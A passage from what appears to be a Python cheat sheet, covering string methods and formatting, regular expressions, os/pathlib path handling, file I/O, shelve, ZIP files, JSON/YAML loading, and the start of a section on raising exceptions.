>>> print(r'That is Carol\'s cat.') That is Carol\'s cat. Note: mostly used for regular expression definition (see re package) Return to the Top Multiline Strings with Triple Quotes >>> print('''Dear Alice, >>> >>> Eve's cat has been arrested for catnapping, cat burglary, and extortion. >>> >>> Sincerely, >>> Bob''') Dear Alice,  Eve's cat has been arrested for catnapping, cat burglary, and extortion.  Sincerely, Bob To keep a nicer flow in your code, you can use the dedent function from the textwrap standard package. >>> from textwrap import dedent >>> >>> def my_function(): >>>     print(''' >>>         Dear Alice, >>> >>>         Eve's cat has been arrested for catnapping, cat burglary, and extortion. >>> >>>         Sincerely, >>>         Bob >>>         ''').strip() This generates the same string than before. Return to the Top Indexing and Slicing Strings H   e   l   l   o       w   o   r   l   d    ! 0   1   2   3   4   5   6   7   8   9   10   11  >>> spam = 'Hello world!'  >>> spam[0] 'H' >>> spam[4] 'o' >>> spam[-1] '!' Slicing: >>> spam[0:5] 'Hello' >>> spam[:5] 'Hello' >>> spam[6:] 'world!' >>> spam[6:-1] 'world' >>> spam[:-1] 'Hello world' >>> spam[::-1] '!dlrow olleH' >>> spam = 'Hello world!' >>> fizz = spam[0:5] >>> fizz 'Hello' Return to the Top The in and not in Operators with Strings >>> 'Hello' in 'Hello World' True >>> 'Hello' in 'Hello' True >>> 'HELLO' in 'Hello World' False >>> '' in 'spam' True >>> 'cats' not in 'cats and dogs' False The in and not in Operators with list >>> a = [1, 2, 3, 4] >>> 5 in a False >>> 2 in a True Return to the Top The upper(), lower(), isupper(), and islower() String Methods upper() and lower(): >>> spam = 'Hello world!' >>> spam = spam.upper() >>> spam 'HELLO WORLD!' >>> spam = spam.lower() >>> spam 'hello world!' isupper() and islower(): >>> spam = 'Hello world!' >>> spam.islower() False >>> spam.isupper() False >>> 'HELLO'.isupper() True >>> 'abc12345'.islower() True >>> '12345'.islower() False >>> '12345'.isupper() False Return to the Top The isX String Methods  isalpha() returns True if the string consists only of letters and is not blank. isalnum() returns True if the string consists only of letters and numbers and is not blank. isdecimal() returns True if the string consists only of numeric characters and is not blank. isspace() returns True if the string consists only of spaces,tabs, and new-lines and is not blank. istitle() returns True if the string consists only of words that begin with an uppercase letter followed by only lowercase letters.  Return to the Top The startswith() and endswith() String Methods >>> 'Hello world!'.startswith('Hello') True >>> 'Hello world!'.endswith('world!') True >>> 'abc123'.startswith('abcdef') False >>> 'abc123'.endswith('12') False >>> 'Hello world!'.startswith('Hello world!') True >>> 'Hello world!'.endswith('Hello world!') True Return to the Top The join() and split() String Methods join(): >>> ', '.join(['cats', 'rats', 'bats']) 'cats, rats, bats' >>> ' '.join(['My', 'name', 'is', 'Simon']) 'My name is Simon' >>> 'ABC'.join(['My', 'name', 'is', 'Simon']) 'MyABCnameABCisABCSimon' split(): >>> 'My name is Simon'.split() ['My', 'name', 'is', 'Simon'] >>> 'MyABCnameABCisABCSimon'.split('ABC') ['My', 'name', 'is', 'Simon'] >>> 'My name is Simon'.split('m') ['My na', 'e is Si', 'on'] Return to the Top Justifying Text with rjust(), ljust(), and center() rjust() and ljust(): >>> 'Hello'.rjust(10) '     Hello' >>> 'Hello'.rjust(20) '               Hello' >>> 'Hello World'.rjust(20) '         Hello World' >>> 'Hello'.ljust(10) 'Hello     ' An optional second argument to rjust() and ljust() will specify a fill character other than a space character. Enter the following into the interactive shell: >>> 'Hello'.rjust(20, '*') '***************Hello' >>> 'Hello'.ljust(20, '-') 'Hello---------------' center(): >>> 'Hello'.center(20) '       Hello       ' >>> 'Hello'.center(20, '=') '=======Hello========' Return to the Top Removing Whitespace with strip(), rstrip(), and lstrip() >>> spam = '    Hello World     ' >>> spam.strip() 'Hello World' >>> spam.lstrip() 'Hello World ' >>> spam.rstrip() '    Hello World' >>> spam = 'SpamSpamBaconSpamEggsSpamSpam' >>> spam.strip('ampS') 'BaconSpamEggs' Return to the Top Copying and Pasting Strings with the pyperclip Module (need pip install) >>> import pyperclip  >>> pyperclip.copy('Hello world!')  >>> pyperclip.paste() 'Hello world!' Return to the Top String Formatting % operator >>> name = 'Pete' >>> 'Hello %s' % name ""Hello Pete"" We can use the %x format specifier to convert an int value to a string: >>> num = 5 >>> 'I have %x apples' % num ""I have 5 apples"" Note: For new code, using str.format or f-strings (Python 3.6+) is strongly recommended over the % operator. Return to the Top String Formatting (str.format) Python 3 introduced a new way to do string formatting that was later back-ported to Python 2.7. This makes the syntax for string formatting more regular. >>> name = 'John' >>> age = 20'  >>> ""Hello I'm {}, my age is {}"".format(name, age) ""Hello I'm John, my age is 20"" >>> ""Hello I'm {0}, my age is {1}"".format(name, age) ""Hello I'm John, my age is 20"" The official Python 3.x documentation recommend str.format over the % operator:  The formatting operations described here exhibit a variety of quirks that lead to a number of common errors (such as failing to display tuples and dictionaries correctly). Using the newer formatted string literals or the str.format() interface helps avoid these errors. These alternatives also provide more powerful, flexible and extensible approaches to formatting text.  Return to the Top Lazy string formatting You would only use %s string formatting on functions that can do lazy parameters evaluation, the most common being logging: Prefer: >>> name = ""alice"" >>> logging.debug(""User name: %s"", name) Over: >>> logging.debug(""User name: {}"".format(name)) Or: >>> logging.debug(""User name: "" + name) Return to the Top Formatted String Literals or f-strings (Python 3.6+) >>> name = 'Elizabeth' >>> f'Hello {name}!' 'Hello Elizabeth! It is even possible to do inline arithmetic with it: >>> a = 5 >>> b = 10 >>> f'Five plus ten is {a + b} and not {2 * (a + b)}.' 'Five plus ten is 15 and not 30.' Return to the Top Template Strings A simpler and less powerful mechanism, but it is recommended when handling format strings generated by users. Due to their reduced complexity template strings are a safer choice. >>> from string import Template >>> name = 'Elizabeth' >>> t = Template('Hey $name!') >>> t.substitute(name=name) 'Hey Elizabeth!' Return to the Top Regular Expressions  Import the regex module with import re. Create a Regex object with the re.compile() function. (Remember to use a raw string.) Pass the string you want to search into the Regex object’s search() method. This returns a Match object. Call the Match object’s group() method to return a string of the actual matched text.  All the regex functions in Python are in the re module: >>> import re Return to the Top Matching Regex Objects >>> phone_num_regex = re.compile(r'\d\d\d-\d\d\d-\d\d\d\d')  >>> mo = phone_num_regex.search('My number is 415-555-4242.')  >>> print('Phone number found: {}'.format(mo.group())) Phone number found: 415-555-4242 Return to the Top Grouping with Parentheses >>> phone_num_regex = re.compile(r'(\d\d\d)-(\d\d\d-\d\d\d\d)')  >>> mo = phone_num_regex.search('My number is 415-555-4242.')  >>> mo.group(1) '415'  >>> mo.group(2) '555-4242'  >>> mo.group(0) '415-555-4242'  >>> mo.group() '415-555-4242' To retrieve all the groups at once: use the groups() method—note the plural form for the name. >>> mo.groups() ('415', '555-4242')  >>> area_code, main_number = mo.groups()  >>> print(area_code) 415  >>> print(main_number) 555-4242 Return to the Top Matching Multiple Groups with the Pipe The | character is called a pipe. You can use it anywhere you want to match one of many expressions. For example, the regular expression r'Batman|Tina Fey' will match either 'Batman' or 'Tina Fey'. >>> hero_regex = re.compile (r'Batman|Tina Fey')  >>> mo1 = hero_regex.search('Batman and Tina Fey.')  >>> mo1.group() 'Batman'  >>> mo2 = hero_regex.search('Tina Fey and Batman.')  >>> mo2.group() 'Tina Fey' You can also use the pipe to match one of several patterns as part of your regex: >>> bat_regex = re.compile(r'Bat(man|mobile|copter|bat)')  >>> mo = bat_regex.search('Batmobile lost a wheel')  >>> mo.group() 'Batmobile'  >>> mo.group(1) 'mobile' Return to the Top Optional Matching with the Question Mark The ? character flags the group that precedes it as an optional part of the pattern. >>> bat_regex = re.compile(r'Bat(wo)?man') >>> mo1 = bat_regex.search('The Adventures of Batman') >>> mo1.group() 'Batman'  >>> mo2 = bat_regex.search('The Adventures of Batwoman') >>> mo2.group() 'Batwoman' Return to the Top Matching Zero or More with the Star The * (called the star or asterisk) means “match zero or more”—the group that precedes the star can occur any number of times in the text. >>> bat_regex = re.compile(r'Bat(wo)*man') >>> mo1 = bat_regex.search('The Adventures of Batman') >>> mo1.group() 'Batman'  >>> mo2 = bat_regex.search('The Adventures of Batwoman') >>> mo2.group() 'Batwoman'  >>> mo3 = bat_regex.search('The Adventures of Batwowowowoman') >>> mo3.group() 'Batwowowowoman' Return to the Top Matching One or More with the Plus While * means “match zero or more,” the + (or plus) means “match one or more”. The group preceding a plus must appear at least once. It is not optional: >>> bat_regex = re.compile(r'Bat(wo)+man') >>> mo1 = bat_regex.search('The Adventures of Batwoman') >>> mo1.group() 'Batwoman' >>> mo2 = bat_regex.search('The Adventures of Batwowowowoman') >>> mo2.group() 'Batwowowowoman' >>> mo3 = bat_regex.search('The Adventures of Batman') >>> mo3 is None True Return to the Top Matching Specific Repetitions with Curly Brackets If you have a group that you want to repeat a specific number of times, follow the group in your regex with a number in curly brackets. For example, the regex (Ha){3} will match the string 'HaHaHa', but it will not match 'HaHa', since the latter has only two repeats of the (Ha) group. Instead of one number, you can specify a range by writing a minimum, a comma, and a maximum in between the curly brackets. For example, the regex (Ha){3,5} will match 'HaHaHa', 'HaHaHaHa', and 'HaHaHaHaHa'. >>> ha_regex = re.compile(r'(Ha){3}') >>> mo1 = ha_regex.search('HaHaHa') >>> mo1.group() 'HaHaHa' >>> mo2 = ha_regex.search('Ha') >>> mo2 is None True Return to the Top Greedy and Nongreedy Matching Python’s regular expressions are greedy by default, which means that in ambiguous situations they will match the longest string possible. The non-greedy version of the curly brackets, which matches the shortest string possible, has the closing curly bracket followed by a question mark. >>> greedy_ha_regex = re.compile(r'(Ha){3,5}') >>> mo1 = greedy_ha_regex.search('HaHaHaHaHa') >>> mo1.group() 'HaHaHaHaHa' >>> nongreedy_ha_regex = re.compile(r'(Ha){3,5}?') >>> mo2 = nongreedy_ha_regex.search('HaHaHaHaHa') >>> mo2.group() 'HaHaHa' Return to the Top The findall() Method In addition to the search() method, Regex objects also have a findall() method. While search() will return a Match object of the first matched text in the searched string, the findall() method will return the strings of every match in the searched string. >>> phone_num_regex = re.compile(r'\d\d\d-\d\d\d-\d\d\d\d') # has no groups  >>> phone_num_regex.findall('Cell: 415-555-9999 Work: 212-555-0000') ['415-555-9999', '212-555-0000'] To summarize what the findall() method returns, remember the following:   When called on a regex with no groups, such as \d-\d\d\d-\d\d\d\d, the method findall() returns a list of ng matches, such as ['415-555-9999', '212-555-0000'].   When called on a regex that has groups, such as (\d\d\d)-(d\d)-(\d\d\d\d), the method findall() returns a list of es of strings (one string for each group), such as [('415', '555', '9999'), ('212', '555', '0000')].   Return to the Top Making Your Own Character Classes There are times when you want to match a set of characters but the shorthand character classes (\d, \w, \s, and so on) are too broad. You can define your own character class using square brackets. For example, the character class [aeiouAEIOU] will match any vowel, both lowercase and uppercase. >>> vowel_regex = re.compile(r'[aeiouAEIOU]')  >>> vowel_regex.findall('Robocop eats baby food. BABY FOOD.') ['o', 'o', 'o', 'e', 'a', 'a', 'o', 'o', 'A', 'O', 'O'] You can also include ranges of letters or numbers by using a hyphen. For example, the character class [a-zA-Z0-9] will match all lowercase letters, uppercase letters, and numbers. By placing a caret character (^) just after the character class’s opening bracket, you can make a negative character class. A negative character class will match all the characters that are not in the character class. For example, enter the following into the interactive shell: >>> consonant_regex = re.compile(r'[^aeiouAEIOU]')  >>> consonant_regex.findall('Robocop eats baby food. BABY FOOD.') ['R', 'b', 'c', 'p', ' ', 't', 's', ' ', 'b', 'b', 'y', ' ', 'f', 'd', '.', ' ', 'B', 'B', 'Y', ' ', 'F', 'D', '.'] Return to the Top The Caret and Dollar Sign Characters   You can also use the caret symbol (^) at the start of a regex to indicate that a match must occur at the beginning of the searched text.   Likewise, you can put a dollar sign ($) at the end of the regex to indicate the string must end with this regex pattern.   And you can use the ^ and $ together to indicate that the entire string must match the regex—that is, it’s not enough for a match to be made on some subset of the string.   The r'^Hello' regular expression string matches strings that begin with 'Hello': >>> begins_with_hello = re.compile(r'^Hello')  >>> begins_with_hello.search('Hello world!') <_sre.SRE_Match object; span=(0, 5), match='Hello'>  >>> begins_with_hello.search('He said hello.') is None True The r'\d$' regular expression string matches strings that end with a numeric character from 0 to 9: >>> whole_string_is_num = re.compile(r'^\d+$')  >>> whole_string_is_num.search('1234567890') <_sre.SRE_Match object; span=(0, 10), match='1234567890'>  >>> whole_string_is_num.search('12345xyz67890') is None True  >>> whole_string_is_num.search('12 34567890') is None True Return to the Top The Wildcard Character The . (or dot) character in a regular expression is called a wildcard and will match any character except for a newline: >>> at_regex = re.compile(r'.at')  >>> at_regex.findall('The cat in the hat sat on the flat mat.') ['cat', 'hat', 'sat', 'lat', 'mat'] Return to the Top Matching Everything with Dot-Star >>> name_regex = re.compile(r'First Name: (.*) Last Name: (.*)')  >>> mo = name_regex.search('First Name: Al Last Name: Sweigart')  >>> mo.group(1) 'Al' >>> mo.group(2) 'Sweigart' The dot-star uses greedy mode: It will always try to match as much text as possible. To match any and all text in a nongreedy fashion, use the dot, star, and question mark (.*?). The question mark tells Python to match in a nongreedy way: >>> nongreedy_regex = re.compile(r'<.*?>') >>> mo = nongreedy_regex.search('<To serve man> for dinner.>') >>> mo.group() '<To serve man>' >>> greedy_regex = re.compile(r'<.*>') >>> mo = greedy_regex.search('<To serve man> for dinner.>') >>> mo.group() '<To serve man> for dinner.>' Return to the Top Matching Newlines with the Dot Character The dot-star will match everything except a newline. By passing re.DOTALL as the second argument to re.compile(), you can make the dot character match all characters, including the newline character: >>> no_newline_regex = re.compile('.*') >>> no_newline_regex.search('Serve the public trust.\nProtect the innocent.\nUphold the law.').group() 'Serve the public trust.' >>> newline_regex = re.compile('.*', re.DOTALL) >>> newline_regex.search('Serve the public trust.\nProtect the innocent.\nUphold the law.').group() 'Serve the public trust.\nProtect the innocent.\nUphold the law.' Return to the Top Review of Regex Symbols    Symbol Matches     ? zero or one of the preceding group.   * zero or more of the preceding group.   + one or more of the preceding group.   {n} exactly n of the preceding group.   {n,} n or more of the preceding group.   {,m} 0 to m of the preceding group.   {n,m} at least n and at most m of the preceding p.   {n,m}? or *? or +? performs a nongreedy match of the preceding p.   ^spam means the string must begin with spam.   spam$ means the string must end with spam.   . any character, except newline characters.   \d, \w, and \s a digit, word, or space character, respectively.   \D, \W, and \S anything except a digit, word, or space, respectively.   [abc] any character between the brackets (such as a, b, ).   [^abc] any character that isn’t between the brackets.    Return to the Top Case-Insensitive Matching To make your regex case-insensitive, you can pass re.IGNORECASE or re.I as a second argument to re.compile(): >>> robocop = re.compile(r'robocop', re.I)  >>> robocop.search('Robocop is part man, part machine, all cop.').group() 'Robocop' >>> robocop.search('ROBOCOP protects the innocent.').group() 'ROBOCOP' >>> robocop.search('Al, why does your programming book talk about robocop so much?').group() 'robocop' Return to the Top Substituting Strings with the sub() Method The sub() method for Regex objects is passed two arguments:  The first argument is a string to replace any matches. The second is the string for the regular expression.  The sub() method returns a string with the substitutions applied: >>> names_regex = re.compile(r'Agent \w+')  >>> names_regex.sub('CENSORED', 'Agent Alice gave the secret documents to Agent Bob.') 'CENSORED gave the secret documents to CENSORED.' Another example: >>> agent_names_regex = re.compile(r'Agent (\w)\w*')  >>> agent_names_regex.sub(r'\1****', 'Agent Alice told Agent Carol that Agent Eve knew Agent Bob was a double agent.') A**** told C**** that E**** knew B**** was a double agent.' Return to the Top Managing Complex Regexes To tell the re.compile() function to ignore whitespace and comments inside the regular expression string, “verbose mode” can be enabled by passing the variable re.VERBOSE as the second argument to re.compile(). Now instead of a hard-to-read regular expression like this: phone_regex = re.compile(r'((\d{3}|\(\d{3}\))?(\s|-|\.)?\d{3}(\s|-|\.)\d{4}(\s*(ext|x|ext.)\s*\d{2,5})?)') you can spread the regular expression over multiple lines with comments like this: phone_regex = re.compile(r'''(     (\d{3}|\(\d{3}\))?            # area code     (\s|-|\.)?                    # separator     \d{3}                         # first 3 digits     (\s|-|\.)                     # separator     \d{4}                         # last 4 digits     (\s*(ext|x|ext.)\s*\d{2,5})?  # extension     )''', re.VERBOSE) Return to the Top Handling File and Directory Paths There are two main modules in Python that deals with path manipulation. One is the os.path module and the other is the pathlib module. The pathlib module was added in Python 3.4, offering an object-oriented way to handle file system paths. Return to the Top Backslash on Windows and Forward Slash on OS X and Linux On Windows, paths are written using backslashes (\) as the separator between folder names. On Unix based operating system such as macOS, Linux, and BSDs, the forward slash (/) is used as the path separator. Joining paths can be a headache if your code needs to work on different platforms. Fortunately, Python provides easy ways to handle this. We will showcase how to deal with this with both os.path.join and pathlib.Path.joinpath Using os.path.join on Windows: >>> import os  >>> os.path.join('usr', 'bin', 'spam') 'usr\\bin\\spam' And using pathlib on *nix: >>> from pathlib import Path  >>> print(Path('usr').joinpath('bin').joinpath('spam')) usr/bin/spam pathlib also provides a shortcut to joinpath using the / operator: >>> from pathlib import Path  >>> print(Path('usr') / 'bin' / 'spam') usr/bin/spam Notice the path separator is different between Windows and Unix based operating system, that's why you want to use one of the above methods instead of adding strings together to join paths together. Joining paths is helpful if you need to create different file paths under the same directory. Using os.path.join on Windows: >>> my_files = ['accounts.txt', 'details.csv', 'invite.docx']  >>> for filename in my_files: >>>     print(os.path.join('C:\\Users\\asweigart', filename)) C:\Users\asweigart\accounts.txt C:\Users\asweigart\details.csv C:\Users\asweigart\invite.docx Using pathlib on *nix: >>> my_files = ['accounts.txt', 'details.csv', 'invite.docx'] >>> home = Path.home() >>> for filename in my_files: >>>     print(home / filename) /home/asweigart/accounts.txt /home/asweigart/details.csv /home/asweigart/invite.docx Return to the Top The Current Working Directory Using os on Windows: >>> import os  >>> os.getcwd() 'C:\\Python34' >>> os.chdir('C:\\Windows\\System32')  >>> os.getcwd() 'C:\\Windows\\System32' Using pathlib on *nix: >>> from pathlib import Path >>> from os import chdir  >>> print(Path.cwd()) /home/asweigart  >>> chdir('/usr/lib/python3.6') >>> print(Path.cwd()) /usr/lib/python3.6 Return to the Top Creating New Folders Using os on Windows: >>> import os >>> os.makedirs('C:\\delicious\\walnut\\waffles') Using pathlib on *nix: >>> from pathlib import Path >>> cwd = Path.cwd() >>> (cwd / 'delicious' / 'walnut' / 'waffles').mkdir() Traceback (most recent call last):   File ""<stdin>"", line 1, in <module>   File ""/usr/lib/python3.6/pathlib.py"", line 1226, in mkdir     self._accessor.mkdir(self, mode)   File ""/usr/lib/python3.6/pathlib.py"", line 387, in wrapped     return strfunc(str(pathobj), *args) FileNotFoundError: [Errno 2] No such file or directory: '/home/asweigart/delicious/walnut/waffles' Oh no, we got a nasty error! The reason is that the 'delicious' directory does not exist, so we cannot make the 'walnut' and the 'waffles' directories under it. To fix this, do: >>> from pathlib import Path >>> cwd = Path.cwd() >>> (cwd / 'delicious' / 'walnut' / 'waffles').mkdir(parents=True) And all is good :) Return to the Top Absolute vs. Relative Paths There are two ways to specify a file path.  An absolute path, which always begins with the root folder A relative path, which is relative to the program’s current working directory  There are also the dot (.) and dot-dot (..) folders. These are not real folders but special names that can be used in a path. A single period (“dot”) for a folder name is shorthand for “this directory.” Two periods (“dot-dot”) means “the parent folder.” Return to the Top Handling Absolute and Relative Paths To see if a path is an absolute path: Using os.path on *nix: >>> import os >>> os.path.isabs('/') True >>> os.path.isabs('..') False Using pathlib on *nix: >>> from pathlib import Path >>> Path('/').is_absolute() True >>> Path('..').is_absolute() False You can extract an absolute path with both os.path and pathlib Using os.path on *nix: >>> import os >>> os.getcwd() '/home/asweigart' >>> os.path.abspath('..') '/home' Using pathlib on *nix: from pathlib import Path print(Path.cwd()) /home/asweigart print(Path('..').resolve()) /home You can get a relative path from a starting path to another path. Using os.path on *nix: >>> import os >>> os.path.relpath('/etc/passwd', '/') 'etc/passwd' Using pathlib on *nix: >>> from pathlib import Path >>> print(Path('/etc/passwd').relative_to('/')) etc/passwd Return to the Top Checking Path Validity Checking if a file/directory exists: Using os.path on *nix: import os >>> os.path.exists('.') True >>> os.path.exists('setup.py') True >>> os.path.exists('/etc') True >>> os.path.exists('nonexistentfile') False Using pathlib on *nix: from pathlib import Path >>> Path('.').exists() True >>> Path('setup.py').exists() True >>> Path('/etc').exists() True >>> Path('nonexistentfile').exists() False Checking if a path is a file: Using os.path on *nix: >>> import os >>> os.path.isfile('setup.py') True >>> os.path.isfile('/home') False >>> os.path.isfile('nonexistentfile') False Using pathlib on *nix: >>> from pathlib import Path >>> Path('setup.py').is_file() True >>> Path('/home').is_file() False >>> Path('nonexistentfile').is_file() False Checking if a path is a directory: Using os.path on *nix: >>> import os >>> os.path.isdir('/') True >>> os.path.isdir('setup.py') False >>> os.path.isdir('/spam') False Using pathlib on *nix: >>> from pathlib import Path >>> Path('/').is_dir() True >>> Path('setup.py').is_dir() False >>> Path('/spam').is_dir() False Return to the Top Finding File Sizes and Folder Contents Getting a file's size in bytes: Using os.path on Windows: >>> import os >>> os.path.getsize('C:\\Windows\\System32\\calc.exe') 776192 Using pathlib on *nix: >>> from pathlib import Path >>> stat = Path('/bin/python3.6').stat() >>> print(stat) # stat contains some other information about the file as well os.stat_result(st_mode=33261, st_ino=141087, st_dev=2051, st_nlink=2, st_uid=0, --snip-- st_gid=0, st_size=10024, st_atime=1517725562, st_mtime=1515119809, st_ctime=1517261276) >>> print(stat.st_size) # size in bytes 10024 Listing directory contents using os.listdir on Windows: >>> import os >>> os.listdir('C:\\Windows\\System32') ['0409', '12520437.cpx', '12520850.cpx', '5U877.ax', 'aaclient.dll', --snip-- 'xwtpdui.dll', 'xwtpw32.dll', 'zh-CN', 'zh-HK', 'zh-TW', 'zipfldr.dll'] Listing directory contents using pathlib on *nix: >>> from pathlib import Path >>> for f in Path('/usr/bin').iterdir(): >>>     print(f) ... /usr/bin/tiff2rgba /usr/bin/iconv /usr/bin/ldd /usr/bin/cache_restore /usr/bin/udiskie /usr/bin/unix2dos /usr/bin/t1reencode /usr/bin/epstopdf /usr/bin/idle3 ... To find the total size of all the files in this directory: WARNING: Directories themselves also have a size! So you might want to check for whether a path is a file or directory using the methods in the methods discussed in the above section! Using os.path.getsize() and os.listdir() together on Windows: >>> import os >>> total_size = 0  >>> for filename in os.listdir('C:\\Windows\\System32'):       total_size = total_size + os.path.getsize(os.path.join('C:\\Windows\\System32', filename))  >>> print(total_size) 1117846456 Using pathlib on *nix: >>> from pathlib import Path >>> total_size = 0  >>> for sub_path in Path('/usr/bin').iterdir(): ...     total_size += sub_path.stat().st_size >>> >>> print(total_size) 1903178911 Return to the Top Copying Files and Folders The shutil module provides functions for copying files, as well as entire folders. >>> import shutil, os  >>> os.chdir('C:\\')  >>> shutil.copy('C:\\spam.txt', 'C:\\delicious')    'C:\\delicious\\spam.txt'  >>> shutil.copy('eggs.txt', 'C:\\delicious\\eggs2.txt')    'C:\\delicious\\eggs2.txt' While shutil.copy() will copy a single file, shutil.copytree() will copy an entire folder and every folder and file contained in it: >>> import shutil, os  >>> os.chdir('C:\\')  >>> shutil.copytree('C:\\bacon', 'C:\\bacon_backup') 'C:\\bacon_backup' Return to the Top Moving and Renaming Files and Folders >>> import shutil >>> shutil.move('C:\\bacon.txt', 'C:\\eggs') 'C:\\eggs\\bacon.txt' The destination path can also specify a filename. In the following example, the source file is moved and renamed: >>> shutil.move('C:\\bacon.txt', 'C:\\eggs\\new_bacon.txt') 'C:\\eggs\\new_bacon.txt' If there is no eggs folder, then move() will rename bacon.txt to a file named eggs. >>> shutil.move('C:\\bacon.txt', 'C:\\eggs') 'C:\\eggs' Return to the Top Permanently Deleting Files and Folders   Calling os.unlink(path) or Path.unlink() will delete the file at path.   Calling os.rmdir(path) or Path.rmdir() will delete the folder at path. This folder must be empty of any files or folders.   Calling shutil.rmtree(path) will remove the folder at path, and all files and folders it contains will also be deleted.   Return to the Top Safe Deletes with the send2trash Module You can install this module by running pip install send2trash from a Terminal window. >>> import send2trash  >>> with open('bacon.txt', 'a') as bacon_file: # creates the file ...     bacon_file.write('Bacon is not a vegetable.') 25  >>> send2trash.send2trash('bacon.txt') Return to the Top Walking a Directory Tree >>> import os >>> >>> for folder_name, subfolders, filenames in os.walk('C:\\delicious'): >>>     print('The current folder is {}'.format(folder_name)) >>> >>>     for subfolder in subfolders: >>>         print('SUBFOLDER OF {}: {}'.format(folder_name, subfolder)) >>>     for filename in filenames: >>>         print('FILE INSIDE {}: {}'.format(folder_name, filename)) >>> >>>     print('') The current folder is C:\delicious SUBFOLDER OF C:\delicious: cats SUBFOLDER OF C:\delicious: walnut FILE INSIDE C:\delicious: spam.txt  The current folder is C:\delicious\cats FILE INSIDE C:\delicious\cats: catnames.txt FILE INSIDE C:\delicious\cats: zophie.jpg  The current folder is C:\delicious\walnut SUBFOLDER OF C:\delicious\walnut: waffles  The current folder is C:\delicious\walnut\waffles FILE INSIDE C:\delicious\walnut\waffles: butter.txt Return to the Top pathlib provides a lot more functionality than the ones listed above, like getting file name, getting file extension, reading/writing a file without manually opening it, etc. Check out the official documentation if you want to know more! Reading and Writing Files The File Reading/Writing Process To read/write to a file in Python, you will want to use the with statement, which will close the file for you after you are done. Return to the Top Opening and reading files with the open() function >>> with open('C:\\Users\\your_home_folder\\hello.txt') as hello_file: ...     hello_content = hello_file.read() >>> hello_content 'Hello World!'  >>> # Alternatively, you can use the *readlines()* method to get a list of string values from the file, one string for each line of text:  >>> with open('sonnet29.txt') as sonnet_file: ...     sonnet_file.readlines() [When, in disgrace with fortune and men's eyes,\n', ' I all alone beweep my outcast state,\n', And trouble deaf heaven with my bootless cries,\n', And look upon myself and curse my fate,']  >>> # You can also iterate through the file line by line: >>> with open('sonnet29.txt') as sonnet_file: ...     for line in sonnet_file: # note the new line character will be included in the line ...         print(line, end='')  When, in disgrace with fortune and men's eyes, I all alone beweep my outcast state, And trouble deaf heaven with my bootless cries, And look upon myself and curse my fate, Return to the Top Writing to Files >>> with open('bacon.txt', 'w') as bacon_file: ...     bacon_file.write('Hello world!\n') 13  >>> with open('bacon.txt', 'a') as bacon_file: ...     bacon_file.write('Bacon is not a vegetable.') 25  >>> with open('bacon.txt') as bacon_file: ...     content = bacon_file.read()  >>> print(content) Hello world! Bacon is not a vegetable. Return to the Top Saving Variables with the shelve Module To save variables: >>> import shelve  >>> cats = ['Zophie', 'Pooka', 'Simon'] >>> with shelve.open('mydata') as shelf_file: ...     shelf_file['cats'] = cats To open and read variables: >>> with shelve.open('mydata') as shelf_file: ...     print(type(shelf_file)) ...     print(shelf_file['cats']) <class 'shelve.DbfilenameShelf'> ['Zophie', 'Pooka', 'Simon'] Just like dictionaries, shelf values have keys() and values() methods that will return list-like values of the keys and values in the shelf. Since these methods return list-like values instead of true lists, you should pass them to the list() function to get them in list form. >>> with shelve.open('mydata') as shelf_file: ...     print(list(shelf_file.keys())) ...     print(list(shelf_file.values())) ['cats'] [['Zophie', 'Pooka', 'Simon']] Return to the Top Saving Variables with the pprint.pformat() Function >>> import pprint  >>> cats = [{'name': 'Zophie', 'desc': 'chubby'}, {'name': 'Pooka', 'desc': 'fluffy'}]  >>> pprint.pformat(cats) ""[{'desc': 'chubby', 'name': 'Zophie'}, {'desc': 'fluffy', 'name': 'Pooka'}]""  >>> with open('myCats.py', 'w') as file_obj: ...     file_obj.write('cats = {}\n'.format(pprint.pformat(cats))) 83 Return to the Top Reading ZIP Files >>> import zipfile, os  >>> os.chdir('C:\\')    # move to the folder with example.zip >>> with zipfile.ZipFile('example.zip') as example_zip: ...     print(example_zip.namelist()) ...     spam_info = example_zip.getinfo('spam.txt') ...     print(spam_info.file_size) ...     print(spam_info.compress_size) ...     print('Compressed file is %sx smaller!' % (round(spam_info.file_size / spam_info.compress_size, 2)))  ['spam.txt', 'cats/', 'cats/catnames.txt', 'cats/zophie.jpg'] 13908 3828 'Compressed file is 3.63x smaller!' Return to the Top Extracting from ZIP Files The extractall() method for ZipFile objects extracts all the files and folders from a ZIP file into the current working directory. >>> import zipfile, os  >>> os.chdir('C:\\')    # move to the folder with example.zip  >>> with zipfile.ZipFile('example.zip') as example_zip: ...     example_zip.extractall() The extract() method for ZipFile objects will extract a single file from the ZIP file. Continue the interactive shell example: >>> with zipfile.ZipFile('example.zip') as example_zip: ...     print(example_zip.extract('spam.txt')) ...     print(example_zip.extract('spam.txt', 'C:\\some\\new\\folders')) 'C:\\spam.txt' 'C:\\some\\new\\folders\\spam.txt' Return to the Top Creating and Adding to ZIP Files >>> import zipfile  >>> with zipfile.ZipFile('new.zip', 'w') as new_zip: ...     new_zip.write('spam.txt', compress_type=zipfile.ZIP_DEFLATED) This code will create a new ZIP file named new.zip that has the compressed contents of spam.txt. Return to the Top JSON, YAML and configuration files JSON Open a JSON file with: import json with open(""filename.json"", ""r"") as f:     content = json.loads(f.read()) Write a JSON file with: import json  content = {""name"": ""Joe"", ""age"": 20} with open(""filename.json"", ""w"") as f:     f.write(json.dumps(content, indent=2)) Return to the Top YAML Compared to JSON, YAML allows for much better human maintainability and gives you the option to add comments. It is a convenient choice for configuration files where humans will have to edit it. There are two main libraries allowing to access to YAML files:  PyYaml Ruamel.yaml  Install them using pip install in your virtual environment. The first one it easier to use but the second one, Ruamel, implements much better the YAML specification, and allow for example to modify a YAML content without altering comments. Open a YAML file with: from ruamel.yaml import YAML  with open(""filename.yaml"") as f:     yaml=YAML()     yaml.load(f) Return to the Top Anyconfig Anyconfig is a very handy package allowing to abstract completely the underlying configuration file format. It allows to load a Python dictionary from JSON, YAML, TOML, and so on. Install it with: pip install anyconfig Usage: import anyconfig  conf1 = anyconfig.load(""/path/to/foo/conf.d/a.yml"") Return to the Top Debugging Raising Exceptions Exceptions are raised with a raise statement. In code, a raise statement consists of the following:  The raise keyword A call to the Exception() function A string with a helpful error message passed to the Exception() function  >>> raise Exception('This is the error message.') Traceback (most recent call last):   File ""<pyshell#191>"", line 1, in <module>     raise Exception('This is the error message.') Exception: This is the error message. Often it’s the code that calls the function, not the function itself, that knows how to handle an exception. So you will commonly see a raise statement inside a function and the try and except statements in the code calling the function. def box_print(symbol, width, height):     if len(symbol) != 1:       raise Exception('Symbol must be a single character string.')     if width <= 2:       raise Exception('Width must be greater than 